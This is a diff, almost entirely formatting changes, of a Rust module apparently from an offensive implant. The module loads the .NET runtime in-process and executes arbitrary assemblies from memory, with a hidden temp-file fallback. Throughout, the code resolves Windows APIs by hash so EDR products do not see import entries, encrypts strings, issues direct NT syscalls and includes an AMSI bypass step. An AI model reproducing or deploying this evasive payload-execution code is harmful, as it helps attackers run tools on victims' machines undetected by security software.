@@ -112,20 +112,15 @@ const CLR_CREATE_INSTANCE: &[u8] = b"CLRCreateInstance\0";
 // export-table hashing (pe_resolve).  This avoids creating IAT entries that
 // EDR products scan for.
 
-type FnCreatePipe = unsafe extern "system" fn(
-    *mut HANDLE, *mut HANDLE, *mut SECURITY_ATTRIBUTES, DWORD,
-) -> i32;
-type FnPeekNamedPipe = unsafe extern "system" fn(
-    HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD,
-) -> i32;
-type FnReadFile = unsafe extern "system" fn(
-    HANDLE, LPVOID, DWORD, LPDWORD, *mut c_void,
-) -> i32;
+type FnCreatePipe =
+    unsafe extern "system" fn(*mut HANDLE, *mut HANDLE, *mut SECURITY_ATTRIBUTES, DWORD) -> i32;
+type FnPeekNamedPipe =
+    unsafe extern "system" fn(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD) -> i32;
+type FnReadFile = unsafe extern "system" fn(HANDLE, LPVOID, DWORD, LPDWORD, *mut c_void) -> i32;
 type FnLoadLibraryW = unsafe extern "system" fn(LPCWSTR) -> HMODULE;
 type FnCoInitializeEx = unsafe extern "system" fn(LPVOID, DWORD) -> HRESULT;
-type FnCreateEventW = unsafe extern "system" fn(
-    *mut SECURITY_ATTRIBUTES, DWORD, DWORD, LPCWSTR,
-) -> HANDLE;
+type FnCreateEventW =
+    unsafe extern "system" fn(*mut SECURITY_ATTRIBUTES, DWORD, DWORD, LPCWSTR) -> HANDLE;
 type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;
 
 /// Resolve a function pointer by DLL hash and function-name hash.
@@ -197,12 +192,10 @@ struct ICLRRuntimeInfoVtable {
     is_loaded: unsafe extern "system" fn(*mut c_void, DWORD, *mut i32) -> HRESULT,
     load_error_string:
         unsafe extern "system" fn(*mut c_void, HRESULT, LPWSTR, *mut DWORD, *mut DWORD) -> HRESULT,
-    load_library:
-        unsafe extern "system" fn(*mut c_void, LPCWSTR, *mut LPVOID) -> HRESULT,
+    load_library: unsafe extern "system" fn(*mut c_void, LPCWSTR, *mut LPVOID) -> HRESULT,
     get_proc_address:
         unsafe extern "system" fn(*mut c_void, LPCWSTR, LPCWSTR, *mut LPVOID) -> HRESULT,
-    bind_as_legacy:
-        unsafe extern "system" fn(*mut c_void) -> HRESULT,
+    bind_as_legacy: unsafe extern "system" fn(*mut c_void) -> HRESULT,
     is_started: unsafe extern "system" fn(*mut c_void, *mut i32, *mut i32) -> HRESULT,
     get_interface:
         unsafe extern "system" fn(*mut c_void, *const CLSID, REFIID, *mut LPVOID) -> HRESULT,
@@ -248,8 +241,7 @@ struct ICLRRuntimeHostVtable {
     stop: unsafe extern "system" fn(*mut c_void) -> HRESULT,
     set_host_control: unsafe extern "system" fn(*mut c_void, *mut c_void) -> HRESULT,
     get_clr_control: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> HRESULT,
-    unload_app_domain:
-        unsafe extern "system" fn(*mut c_void, DWORD, i32) -> HRESULT,
+    unload_app_domain: unsafe extern "system" fn(*mut c_void, DWORD, i32) -> HRESULT,
     execute_in_default_app_domain: unsafe extern "system" fn(
         *mut c_void,
         LPCWSTR,
@@ -334,8 +326,7 @@ struct IDispatchVtable {
     add_ref: unsafe extern "system" fn(*mut c_void) -> ULONG,
     release: unsafe extern "system" fn(*mut c_void) -> ULONG,
     get_type_info_count: unsafe extern "system" fn(*mut c_void, *mut u32) -> HRESULT,
-    get_type_info:
-        unsafe extern "system" fn(*mut c_void, u32, u32, *mut *mut c_void) -> HRESULT,
+    get_type_info: unsafe extern "system" fn(*mut c_void, u32, u32, *mut *mut c_void) -> HRESULT,
     get_ids_of_names: unsafe extern "system" fn(
         *mut c_void,    // this
         REFIID,         // riid
@@ -345,15 +336,15 @@ struct IDispatchVtable {
         *mut i32,       // rgDispId
     ) -> HRESULT,
     invoke: unsafe extern "system" fn(
-        *mut c_void,    // this
-        i32,            // dispIdMember
-        REFIID,         // riid
-        u32,            // lcid
-        u16,            // wFlags
-        *mut DISPPARAMS,// pDispParams
-        *mut VARIANT,   // pVarResult
-        *mut EXCEPINFO, // pExcepInfo
-        *mut u32,       // puArgErr
+        *mut c_void,     // this
+        i32,             // dispIdMember
+        REFIID,          // riid
+        u32,             // lcid
+        u16,             // wFlags
+        *mut DISPPARAMS, // pDispParams
+        *mut VARIANT,    // pVarResult
+        *mut EXCEPINFO,  // pExcepInfo
+        *mut u32,        // puArgErr
     ) -> HRESULT,
 }
 
@@ -522,13 +513,12 @@ struct EXCEPINFO {
 // ── OLEAUT32 function pointer types ──────────────────────────────────────────
 
 type FnSafeArrayCreateVector = unsafe extern "system" fn(
-    u16,         // vt (element type)
-    i32,         // lLbound (lower bound)
-    u32,         // cElements (count)
+    u16, // vt (element type)
+    i32, // lLbound (lower bound)
+    u32, // cElements (count)
 ) -> *mut c_void; // SAFEARRAY*
 
-type FnSafeArrayAccessData =
-    unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> HRESULT;
+type FnSafeArrayAccessData = unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> HRESULT;
 
 type FnSafeArrayUnaccessData = unsafe extern "system" fn(*mut c_void) -> HRESULT;
 
@@ -542,8 +532,7 @@ type FnVariantClear = unsafe extern "system" fn(*mut VARIANT) -> HRESULT;
 
 // ── CLRCreateInstance function signature ─────────────────────────────────────
 
-type FnCLRCreateInstance =
-    unsafe extern "system" fn(*const CLSID, REFIID, *mut LPVOID) -> HRESULT;
+type FnCLRCreateInstance = unsafe extern "system" fn(*const CLSID, REFIID, *mut LPVOID) -> HRESULT;
 
 // ── Global CLR Host State ────────────────────────────────────────────────────
 
@@ -646,10 +635,7 @@ unsafe fn resolve_oleaut32_fn<T>(name: &[u8]) -> Option<T> {
     if oleaut32.is_null() {
         return None;
     }
-    let proc = pe_resolve::get_proc_address_by_hash(
-        oleaut32 as usize,
-        pe_resolve::hash_str(name),
-    )?;
+    let proc = pe_resolve::get_proc_address_by_hash(oleaut32 as usize, pe_resolve::hash_str(name))?;
     Some(std::mem::transmute_copy(&proc))
 }
 
@@ -673,7 +659,10 @@ unsafe fn safe_array_from_bytes(data: &[u8]) -> Result<*mut c_void, String> {
         if let Some(destroy) = resolve_oleaut32_fn::<FnSafeArrayDestroy>(b"SafeArrayDestroy\0") {
             destroy(sa);
         }
-        return Err(format!("SafeArrayAccessData failed: hr={:#010X}", hr as u32));
+        return Err(format!(
+            "SafeArrayAccessData failed: hr={:#010X}",
+            hr as u32
+        ));
     }
     std::ptr::copy_nonoverlapping(data.as_ptr(), pv as *mut u8, data.len());
     unaccess_data(sa);
@@ -699,7 +688,10 @@ unsafe fn safe_array_from_variants(variants: &[VARIANT]) -> Result<*mut c_void, 
         if let Some(destroy) = resolve_oleaut32_fn::<FnSafeArrayDestroy>(b"SafeArrayDestroy\0") {
             destroy(sa);
         }
-        return Err(format!("SafeArrayAccessData failed: hr={:#010X}", hr as u32));
+        return Err(format!(
+            "SafeArrayAccessData failed: hr={:#010X}",
+            hr as u32
+        ));
     }
     std::ptr::copy_nonoverlapping(
         variants.as_ptr() as *const u8,
@@ -712,7 +704,9 @@ unsafe fn safe_array_from_variants(variants: &[VARIANT]) -> Result<*mut c_void, 
 
 /// Destroy a SAFEARRAY.
 unsafe fn safe_array_destroy(sa: *mut c_void) {
-    if sa.is_null() { return; }
+    if sa.is_null() {
+        return;
+    }
     if let Some(destroy) = resolve_oleaut32_fn::<FnSafeArrayDestroy>(b"SafeArrayDestroy\0") {
         destroy(sa);
     }
@@ -777,7 +771,9 @@ unsafe fn dispatch_invoke(
             let mut chars = Vec::new();
             let mut p = excep_info.bstr_description;
             for _ in 0..256 {
-                if *p == 0 { break; }
+                if *p == 0 {
+                    break;
+                }
                 chars.push(*p);
                 p = p.add(1);
             }
@@ -789,7 +785,10 @@ unsafe fn dispatch_invoke(
         } else {
             format!("hr={:#010X}", hr as u32)
         };
-        return Err(format!("IDispatch::Invoke(DISPID={}) failed: {}", dispid, desc));
+        return Err(format!(
+            "IDispatch::Invoke(DISPID={}) failed: {}",
+            dispid, desc
+        ));
     }
     Ok(result)
 }
@@ -811,7 +810,9 @@ unsafe fn sys_alloc_string(s: &[u16]) -> *mut u16 {
 
 /// Free a BSTR.
 unsafe fn sys_free_string(s: *mut u16) {
-    if s.is_null() { return; }
+    if s.is_null() {
+        return;
+    }
     if let Some(free) = resolve_oleaut32_fn::<FnSysFreeString>(b"SysFreeString\0") {
         free(s);
     }
@@ -827,7 +828,8 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
     let load_library_w: FnLoadLibraryW = resolve_api(
         pe_resolve::HASH_KERNEL32_DLL,
         pe_resolve::hash_str(b"LoadLibraryW\0"),
-    ).ok_or("cannot resolve LoadLibraryW from kernel32")?;
+    )
+    .ok_or("cannot resolve LoadLibraryW from kernel32")?;
 
     let mscoree_name = string_crypt::enc_wstr!("mscoree.dll");
     let mscoree = load_library_w(mscoree_name.as_ptr());
@@ -840,7 +842,8 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
     let proc = pe_resolve::get_proc_address_by_hash(
         mscoree as usize,
         pe_resolve::hash_str(CLR_CREATE_INSTANCE),
-    ).ok_or("CLRCreateInstance not found in mscoree.dll")?;
+    )
+    .ok_or("CLRCreateInstance not found in mscoree.dll")?;
     let create_instance: FnCLRCreateInstance = std::mem::transmute(proc);
 
     // ── Create ICLRMetaHost ──────────────────────────────────────────────
@@ -921,7 +924,11 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
         }
 
         let version_str = String::from_utf16_lossy(
-            &version_buf[..buf_len as usize].iter().copied().filter(|&c| c != 0).collect::<Vec<u16>>(),
+            &version_buf[..buf_len as usize]
+                .iter()
+                .copied()
+                .filter(|&c| c != 0)
+                .collect::<Vec<u16>>(),
         );
         log::info!("[assembly_loader] found runtime: {}", version_str.trim());
 
@@ -994,7 +1001,10 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
     let hr = ((*runtime_host.vtable).start)(runtime_host_ptr);
     if hr != S_OK {
         ((*runtime_host.vtable).release)(runtime_host_ptr);
-        return Err(format!("ICLRRuntimeHost::Start() failed: hr={:#010X}", hr as u32));
+        return Err(format!(
+            "ICLRRuntimeHost::Start() failed: hr={:#010X}",
+            hr as u32
+        ));
     }
 
     log::info!("[assembly_loader] CLR started successfully");
@@ -1063,13 +1073,22 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
                     );
                 }
                 let vs = String::from_utf16_lossy(
-                    &vbuf[..blen as usize].iter().copied().filter(|&c| c != 0).collect::<Vec<u16>>(),
+                    &vbuf[..blen as usize]
+                        .iter()
+                        .copied()
+                        .filter(|&c| c != 0)
+                        .collect::<Vec<u16>>(),
                 );
                 let nv = if vs.starts_with('v') || vs.starts_with('V') {
-                    let d: String = vs.trim_start_matches(|c: char| !c.is_ascii_digit())
-                        .chars().take_while(|c| c.is_ascii_digit() || *c == '.').collect();
+                    let d: String = vs
+                        .trim_start_matches(|c: char| !c.is_ascii_digit())
+                        .chars()
+                        .take_while(|c| c.is_ascii_digit() || *c == '.')
+                        .collect();
                     parse_version_to_u32(&d)
-                } else { 0 };
+                } else {
+                    0
+                };
                 if nv >= 4_000_000 && nv > best_ver2 {
                     best_ver2 = nv;
                     if let Some(old) = best_rt2.take() {
@@ -1091,7 +1110,9 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
                     &mut cor_host_ptr,
                 );
                 if hr == S_OK && !cor_host_ptr.is_null() {
-                    log::info!("[assembly_loader] ICorRuntimeHost obtained — in-memory loading available");
+                    log::info!(
+                        "[assembly_loader] ICorRuntimeHost obtained — in-memory loading available"
+                    );
                 } else {
                     log::warn!(
                         "[assembly_loader] GetInterface(ICorRuntimeHost) failed: hr={:#010X} — will use file-based fallback",
@@ -1106,16 +1127,16 @@ unsafe fn init_clr_host() -> Result<(*mut ICLRRuntimeHost, *mut ICorRuntimeHost)
         ((*mh2.vtable).release)(meta_host_ptr2);
     }
 
-    Ok((runtime_host_ptr as *mut ICLRRuntimeHost, cor_host_ptr as *mut ICorRuntimeHost))
+    Ok((
+        runtime_host_ptr as *mut ICLRRuntimeHost,
+        cor_host_ptr as *mut ICorRuntimeHost,
+    ))
 }
 
 /// Parse a version string like "4.0.30319.42000" into a u32 for comparison.
 /// Returns e.g. 4_030_319 for "4.0.30319".  Only uses first 3 components.
 fn parse_version_to_u32(s: &str) -> u32 {
-    let parts: Vec<u32> = s
-        .split('.')
-        .filter_map(|p| p.parse().ok())
-        .collect();
+    let parts: Vec<u32> = s.split('.').filter_map(|p| p.parse().ok()).collect();
     match parts.len() {
         0 => 0,
         1 => parts[0] * 1_000_000,
@@ -1214,13 +1235,15 @@ const COMMON_ENTRY_TYPE_NAMES: &[&str] = &["Program", "App", "Startup", "EntryPo
 /// Read a u16 from a byte slice at the given offset (bounds-checked).
 #[inline]
 fn read_u16_at(data: &[u8], off: usize) -> Option<u16> {
-    data.get(off..off + 2).map(|b| u16::from_le_bytes([b[0], b[1]]))
+    data.get(off..off + 2)
+        .map(|b| u16::from_le_bytes([b[0], b[1]]))
 }
 
 /// Read a u32 from a byte slice at the given offset (bounds-checked).
 #[inline]
 fn read_u32_at(data: &[u8], off: usize) -> Option<u32> {
-    data.get(off..off + 4).map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
+    data.get(off..off + 4)
+        .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
 }
 
 /// Read a null-terminated string from the #Strings heap at the given byte index.
@@ -1432,7 +1455,9 @@ fn extract_entry_point_type_name_inner(data: &[u8]) -> Option<String> {
     let mdef_row = 4 + 2 + 2 + str_sz + blob_sz + param_idx_sz;
 
     // ── Compute table offsets ──────────────────────────────────────────
-    let table_row_sizes: [usize; 7] = [mod_row, tref_row, tdef_row, fptr_row, fld_row, mptr_row, mdef_row];
+    let table_row_sizes: [usize; 7] = [
+        mod_row, tref_row, tdef_row, fptr_row, fld_row, mptr_row, mdef_row,
+    ];
     let mut tdef_off: usize = 0;
     let mut mdef_off: usize = 0;
 
@@ -1565,10 +1590,7 @@ unsafe fn execute_in_memory_internal(
 
     // ── 1. Get default AppDomain ────────────────────────────────────────
     let mut appdomain_ptr: *mut c_void = std::ptr::null_mut();
-    let hr = ((*host.vtable).get_default_domain)(
-        cor_host as *mut c_void,
-        &mut appdomain_ptr,
-    );
+    let hr = ((*host.vtable).get_default_domain)(cor_host as *mut c_void, &mut appdomain_ptr);
     if hr != S_OK || appdomain_ptr.is_null() {
         return Err(format!(
             "ICorRuntimeHost::GetDefaultDomain failed: hr={:#010X}",
@@ -1611,7 +1633,8 @@ unsafe fn execute_in_memory_internal(
         c_named_args: 0,
     };
 
-    let mut assembly_result = dispatch_invoke(appdomain, dispid_load, DISPATCH_METHOD, &mut load_params)?;
+    let mut assembly_result =
+        dispatch_invoke(appdomain, dispid_load, DISPATCH_METHOD, &mut load_params)?;
     variant_clear(&mut load_arg);
     safe_array_destroy(sa_bytes);
 
@@ -1645,7 +1668,12 @@ unsafe fn execute_in_memory_internal(
         c_named_args: 0,
     };
 
-    let mut ep_result = dispatch_invoke(assembly_disp, dispid_ep, DISPATCH_PROPERTYGET, &mut ep_params)?;
+    let mut ep_result = dispatch_invoke(
+        assembly_disp,
+        dispid_ep,
+        DISPATCH_PROPERTYGET,
+        &mut ep_params,
+    )?;
 
     if ep_result.vt != VT_DISPATCH && ep_result.vt != VT_UNKNOWN {
         let vt = ep_result.vt;
@@ -1671,20 +1699,24 @@ unsafe fn execute_in_memory_internal(
     // The args parameter is a string[] on the managed side, which we pass
     // as object[] of strings.
 
-    let arg_bstrs: Vec<*mut u16> = args.iter().map(|a| {
-        let wide = to_wide(a);
-        unsafe { sys_alloc_string(&wide) }
-    }).collect();
+    let arg_bstrs: Vec<*mut u16> = args
+        .iter()
+        .map(|a| {
+            let wide = to_wide(a);
+            unsafe { sys_alloc_string(&wide) }
+        })
+        .collect();
 
-    let arg_variants: Vec<VARIANT> = arg_bstrs.iter().map(|bstr| {
-        VARIANT {
+    let arg_variants: Vec<VARIANT> = arg_bstrs
+        .iter()
+        .map(|bstr| VARIANT {
             vt: VT_BSTR,
             w_reserved1: 0,
             w_reserved2: 0,
             w_reserved3: 0,
             data: VARIANTData { bstr_val: *bstr },
-        }
-    }).collect();
+        })
+        .collect();
 
     let sa_args = if arg_variants.is_empty() {
         std::ptr::null_mut()
@@ -1696,7 +1728,8 @@ unsafe fn execute_in_memory_internal(
     let create_pipe: FnCreatePipe = resolve_api(
         pe_resolve::HASH_KERNEL32_DLL,
         pe_resolve::hash_str(b"CreatePipe\0"),
-    ).ok_or("cannot resolve CreatePipe")?;
+    )
+    .ok_or("cannot resolve CreatePipe")?;
 
     let mut sa = SECURITY_ATTRIBUTES {
         nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
@@ -1767,13 +1800,15 @@ unsafe fn execute_in_memory_internal(
         pe_resolve::get_proc_address_by_hash(
             pe_resolve::HASH_KERNEL32_DLL as usize,
             pe_resolve::hash_str(b"GetStdHandle\0"),
-        ).ok_or("cannot resolve GetStdHandle")?
+        )
+        .ok_or("cannot resolve GetStdHandle")?,
     );
     let set_std_handle: unsafe extern "system" fn(u32, HANDLE) -> i32 = std::mem::transmute(
         pe_resolve::get_proc_address_by_hash(
             pe_resolve::HASH_KERNEL32_DLL as usize,
             pe_resolve::hash_str(b"SetStdHandle\0"),
-        ).ok_or("cannot resolve SetStdHandle")?
+        )
+        .ok_or("cannot resolve SetStdHandle")?,
     );
     const STD_OUTPUT_HANDLE: u32 = 0xFFFFFFF5u32 as u32;
     const STD_ERROR_HANDLE: u32 = 0xFFFFFFF4u32 as u32;
@@ -1824,7 +1859,9 @@ unsafe fn execute_in_memory_internal(
                 let mut chars = Vec::new();
                 let mut p = excep.bstr_description;
                 for _ in 0..256 {
-                    if *p == 0 { break; }
+                    if *p == 0 {
+                        break;
+                    }
                     chars.push(*p);
                     p = p.add(1);
                 }
@@ -1844,7 +1881,8 @@ unsafe fn execute_in_memory_internal(
     let close_handle: FnCloseHandle = resolve_api(
         pe_resolve::HASH_KERNEL32_DLL,
         pe_resolve::hash_str(b"CloseHandle\0"),
-    ).ok_or("cannot resolve CloseHandle")?;
+    )
+    .ok_or("cannot resolve CloseHandle")?;
 
     let _timeout_ms = timeout_secs * 1000;
     let mut needs_reinit = false;
@@ -1890,14 +1928,10 @@ unsafe fn execute_in_memory_internal(
                 log::info!("[assembly_loader] CLR exec thread terminated (status 0x{s:08X})");
             }
             Ok(s) => {
-                log::warn!(
-                    "[assembly_loader] NtTerminateThread returned failure 0x{s:08X}"
-                );
+                log::warn!("[assembly_loader] NtTerminateThread returned failure 0x{s:08X}");
             }
             Err(e) => {
-                log::warn!(
-                    "[assembly_loader] NtTerminateThread syscall failed: {e}"
-                );
+                log::warn!("[assembly_loader] NtTerminateThread syscall failed: {e}");
             }
         }
         // Drop the JoinHandle without joining — the thread is already dead.
@@ -1943,7 +1977,10 @@ unsafe fn execute_in_memory_internal(
     let unk = &*(appdomain_ptr as *const ICLRRuntimeHost);
     ((*unk.vtable).release)(appdomain_ptr);
 
-    log::info!("[assembly_loader] in-memory: execution complete, {} bytes output", output.len());
+    log::info!(
+        "[assembly_loader] in-memory: execution complete, {} bytes output",
+        output.len()
+    );
 
     if needs_reinit {
         // Flag CLR for reinit on next call.
@@ -1992,7 +2029,11 @@ pub unsafe fn execute(
         ));
     }
     if args.len() > MAX_ARGS {
-        return Err(format!("too many arguments: {} (max {})", args.len(), MAX_ARGS));
+        return Err(format!(
+            "too many arguments: {} (max {})",
+            args.len(),
+            MAX_ARGS
+        ));
     }
 
     // ── AMSI bypass ─────────────────────────────────────────────────────
@@ -2006,8 +2047,15 @@ pub unsafe fn execute(
     if !COM_INITIALIZED.load(Ordering::Relaxed) {
         // Ensure ole32.dll is loaded, then resolve CoInitializeEx dynamically.
         let ole32_hash = pe_resolve::hash_wstr(&[
-            b'o' as u16, b'l' as u16, b'e' as u16, b'3' as u16, b'2' as u16,
-            b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
+            b'o' as u16,
+            b'l' as u16,
+            b'e' as u16,
+            b'3' as u16,
+            b'2' as u16,
+            b'.' as u16,
+            b'd' as u16,
+            b'l' as u16,
+            b'l' as u16,
         ]);
         let ole32_base = match pe_resolve::get_module_handle_by_hash(ole32_hash) {
             Some(base) => base,
@@ -2016,7 +2064,8 @@ pub unsafe fn execute(
                 let load_lib: FnLoadLibraryW = resolve_api(
                     pe_resolve::HASH_KERNEL32_DLL,
                     pe_resolve::hash_str(b"LoadLibraryW\0"),
-                ).ok_or("cannot resolve LoadLibraryW for ole32 load")?;
+                )
+                .ok_or("cannot resolve LoadLibraryW for ole32 load")?;
                 let name = to_wide("ole32.dll");
                 let base = load_lib(name.as_ptr()) as usize;
                 if base == 0 {
@@ -2028,8 +2077,9 @@ pub unsafe fn execute(
         let co_init: FnCoInitializeEx = pe_resolve::get_proc_address_by_hash(
             ole32_base,
             pe_resolve::hash_str(b"CoInitializeEx\0"),
-        ).map(|addr| std::mem::transmute::<_, FnCoInitializeEx>(addr))
-         .ok_or("cannot resolve CoInitializeEx from ole32.dll")?;
+        )
+        .map(|addr| std::mem::transmute::<_, FnCoInitializeEx>(addr))
+        .ok_or("cannot resolve CoInitializeEx from ole32.dll")?;
 
         let hr = co_init(std::ptr::null_mut(), 0x0); // COINIT_APARTMENTTHREADED
         if hr as u32 != S_OK as u32 && hr as u32 != 0x80010106 {
@@ -2047,7 +2097,9 @@ pub unsafe fn execute(
 
     // ── Ensure CLR host is initialized ──────────────────────────────────
     let (runtime_host, cor_host) = {
-        let mut guard = CLR_HOST.lock().map_err(|e| format!("CLR_HOST lock poisoned: {e}"))?;
+        let mut guard = CLR_HOST
+            .lock()
+            .map_err(|e| format!("CLR_HOST lock poisoned: {e}"))?;
         match *guard {
             Some(ref mut state)
                 if state.initialized && !state.runtime_host.is_null() && !state.needs_reinit =>
@@ -2103,9 +2155,7 @@ pub unsafe fn execute(
     // If in-memory loading fails or is unavailable, fall through to the
     // existing file-based ExecuteInDefaultAppDomain path.
     if !cor_host.is_null() {
-        log::info!(
-            "[assembly_loader] attempting in-memory assembly loading (no disk write)"
-        );
+        log::info!("[assembly_loader] attempting in-memory assembly loading (no disk write)");
         match execute_in_memory_internal(
             cor_host,
             assembly_bytes,
@@ -2125,9 +2175,7 @@ pub unsafe fn execute(
             }
         }
     } else {
-        log::info!(
-            "[assembly_loader] ICorRuntimeHost not available, using file-based path"
-        );
+        log::info!("[assembly_loader] ICorRuntimeHost not available, using file-based path");
     }
 
     // ── Write assembly to NT-native temp file (fallback path) ────────
@@ -2163,9 +2211,14 @@ pub unsafe fn execute(
     let temp_file = temp_dir.join(format!("{file_uuid}.dll"));
 
     // Convert Win32 path to NT path format: C:\... → \??\C:\...
-    let win32_str = temp_file.to_str().ok_or_else(|| "temp path is not valid UTF-8".to_string())?;
+    let win32_str = temp_file
+        .to_str()
+        .ok_or_else(|| "temp path is not valid UTF-8".to_string())?;
     let nt_path_str = format!(r"\??\{win32_str}");
-    let mut nt_path_wide: Vec<u16> = nt_path_str.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut nt_path_wide: Vec<u16> = nt_path_str
+        .encode_utf16()
+        .chain(std::iter::once(0))
+        .collect();
 
     let mut obj_name = winapi::shared::ntdef::UNICODE_STRING {
         Length: ((nt_path_wide.len() - 1) * 2) as u16,
@@ -2185,17 +2238,17 @@ pub unsafe fn execute(
 
     let create_status = crate::syscall!(
         "NtCreateFile",
-        &mut h_file as *mut _ as u64,          // FileHandle
+        &mut h_file as *mut _ as u64, // FileHandle
         (SYNCHRONIZE | GENERIC_WRITE | GENERIC_READ) as u64, // DesiredAccess
-        &mut obj_attr as *mut _ as u64,        // ObjectAttributes
-        io_status.as_mut_ptr() as u64,         // IoStatusBlock
-        0u64,                                   // AllocationSize (null)
+        &mut obj_attr as *mut _ as u64, // ObjectAttributes
+        io_status.as_mut_ptr() as u64, // IoStatusBlock
+        0u64,                         // AllocationSize (null)
         (FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN) as u64, // FileAttributes
         (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as u64, // ShareAccess
-        FILE_SUPERSEDE as u64,                 // CreateDisposition
+        FILE_SUPERSEDE as u64,        // CreateDisposition
         (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE) as u64, // CreateOptions
-        0u64,                                   // EaBuffer
-        0u64,                                   // EaLength
+        0u64, // EaBuffer
+        0u64, // EaLength
     );
     if create_status.is_err() || create_status.as_ref().map(|s| *s).unwrap_or(-1) < 0 {
         return Err(format!(
@@ -2210,15 +2263,15 @@ pub unsafe fn execute(
         let chunk = &assembly_bytes[offset..];
         let write_status = crate::syscall!(
             "NtWriteFile",
-            h_file as u64,                       // FileHandle
-            0u64,                                 // Event
-            0u64,                                 // ApcRoutine
-            0u64,                                 // ApcContext
-            io_status.as_mut_ptr() as u64,       // IoStatusBlock
-            chunk.as_ptr() as u64,               // Buffer
+            h_file as u64,                             // FileHandle
+            0u64,                                      // Event
+            0u64,                                      // ApcRoutine
+            0u64,                                      // ApcContext
+            io_status.as_mut_ptr() as u64,             // IoStatusBlock
+            chunk.as_ptr() as u64,                     // Buffer
             chunk.len().min(u32::MAX as usize) as u64, // Length
-            &offset as *const _ as u64,          // ByteOffset
-            0u64,                                 // Key
+            &offset as *const _ as u64,                // ByteOffset
+            0u64,                                      // Key
         );
         if write_status.is_err() || write_status.as_ref().map(|s| *s).unwrap_or(-1) < 0 {
             let _ = crate::syscall!("NtClose", h_file as u64);
@@ -2258,7 +2311,8 @@ pub unsafe fn execute(
     let create_pipe: FnCreatePipe = resolve_api(
         pe_resolve::HASH_KERNEL32_DLL,
         pe_resolve::hash_str(b"CreatePipe\0"),
-    ).ok_or("cannot resolve CreatePipe")?;
+    )
+    .ok_or("cannot resolve CreatePipe")?;
 
     if create_pipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
         let _ = crate::syscall!("NtClose", h_file as u64);
@@ -2298,7 +2352,8 @@ pub unsafe fn execute(
     let create_event_w: FnCreateEventW = resolve_api(
         pe_resolve::HASH_KERNEL32_DLL,
         pe_resolve::hash_str(b"CreateEventW\0"),
-    ).ok_or("cannot resolve CreateEventW")?;
+    )
+    .ok_or("cannot resolve CreateEventW")?;
 
     let timeout_event = create_event_w(std::ptr::null_mut(), 1, 0, std::ptr::null_mut());
     if timeout_event.is_null() {
@@ -2445,7 +2500,10 @@ pub unsafe fn execute(
     }
 
     let output = String::from_utf8_lossy(&captured_output).to_string();
-    Ok(AssemblyResult { output, hresult: hr })
+    Ok(AssemblyResult {
+        output,
+        hresult: hr,
+    })
 }
 
 // ── Error codes ──────────────────────────────────────────────────────────────
